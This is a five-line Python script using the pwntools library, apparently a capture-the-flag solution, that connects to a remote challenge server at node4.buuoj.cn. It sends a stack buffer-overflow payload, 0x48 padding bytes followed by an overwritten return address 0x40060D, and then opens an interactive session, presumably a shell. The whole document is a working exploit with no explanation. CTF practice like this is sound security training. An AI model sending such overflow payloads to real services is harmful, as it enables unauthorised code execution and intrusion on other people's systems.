from pwn import *
ljw = remote("node4.buuoj.cn", 29402)
ljw_payload = b'M'*(0x40+8)+p64(0x40060D)
ljw.sendline(ljw_payload)
ljw.interactive()
